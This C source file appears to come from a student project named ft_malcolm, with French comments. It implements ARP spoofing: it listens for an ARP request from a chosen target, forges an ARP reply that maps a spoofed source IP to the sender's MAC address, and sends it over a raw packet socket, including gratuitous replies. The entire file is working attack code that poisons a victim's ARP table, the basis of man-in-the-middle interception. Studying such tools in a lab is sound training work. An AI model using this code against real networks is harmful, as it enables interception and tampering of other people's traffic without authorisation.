#include "ft_malcolm.h"

int receive_arp(int sockfd, uint8_t *buffer, t_addrs *addrs)
{
	struct arp_packet 	*arp;

	arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE); // arp = uint d arp taille 42 +  14 pour header eth pour garder offset, l eth sera avant.
	while (1)
	{
		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0) // ecrit resultat dans buffer si recoit arp
		{
			if (g_sockfd != -1)
				printf("recvfrom: %s\n", strerror(errno));
			return (0);
		}
		// verif qu on a  recu la bonne requete arp attendu. 
		if (ntohs(arp->opcode) != 1) // big endian to little endian => request == 1 
			continue;
		if (ft_memcmp(arp->dst_ip, addrs->source_ip, 4) != 0)
			continue;
		if (ft_memcmp(arp->src_ip, addrs->target_ip, 4) != 0)
			continue;
		if (ft_memcmp(arp->src_mac, addrs->target_mac, 6) != 0)
			continue;
		return (1);
	}
}

void build_reply(uint8_t *reply, t_addrs *addrs)
{
	struct ethernet_header *eth; // avec info de reply eth que pour la reply.
	struct arp_packet      *arp;

	ft_memset(reply, 0, ARP_FRAME_SIZE);
	eth = (struct ethernet_header *)reply; // des le debut 14 octet
	ft_memcpy(eth->dst_mac, addrs->target_mac, 6); // tu renvois a lasker mac
	ft_memcpy(eth->src_mac, addrs->source_mac, 6); // tu donne ton addresse mac perso
	eth->ethertype = htons(ETH_P_ARP); // eth requete pour arp (marche aussi pour wifi)
	arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
	arp->hw_type    = htons(1); // ethernet (couche reseau wifi/ethernet pour 1)
	arp->proto_type = htons(0x0800); //  ipv4
	arp->hw_size    = 6; // taille mac en octet
	arp->proto_size = 4; // 4 octet ipv4
	arp->opcode     = htons(2); // reply opcode
	ft_memcpy(arp->src_mac, addrs->source_mac, 6);
	ft_memcpy(arp->src_ip,  addrs->source_ip,  4);
	ft_memcpy(arp->dst_mac, addrs->target_mac, 6);
	ft_memcpy(arp->dst_ip,  addrs->target_ip,  4);
}

int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int interface_idx, int hex)
{
	struct sockaddr_ll dest;

	ft_memset(&dest, 0, sizeof(dest));
	dest.sll_ifindex = interface_idx; // pas l interface de notre socket
	dest.sll_family  = AF_PACKET; // packet L2
	dest.sll_halen   = 6; // mac Len
	ft_memcpy(dest.sll_addr, target_mac, 6); // mac victime
	if (hex)
		hexdump(reply, ARP_FRAME_SIZE);
	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		printf("sendto: %s\n", strerror(errno));
		return (0);
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	return (1);
}

int send_gratuitous(t_addrs *addrs, int interface_idx, int verbose, int hex)
{
	uint8_t reply[ARP_FRAME_SIZE];

	if (verbose)
		print_verbose_gratuitous(addrs);
	build_reply(reply, addrs);
	printf("Sending gratuitous ARP reply...\n");
	return (send_reply(g_sockfd, reply, addrs->target_mac, interface_idx, hex));
}

int run_spoof(t_addrs *addrs, int interface_idx, int verbose, int hex)
{
	uint8_t 			reply[ARP_FRAME_SIZE];
	uint8_t 			buffer[ARP_FRAME_SIZE];

	if (!receive_arp(g_sockfd, buffer, addrs))
		return (0);
	log_arp_request(buffer);
	if (verbose)
		print_verbose(buffer, addrs);
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	build_reply(reply, addrs);
	return (send_reply(g_sockfd, reply, addrs->target_mac, interface_idx, hex));
}
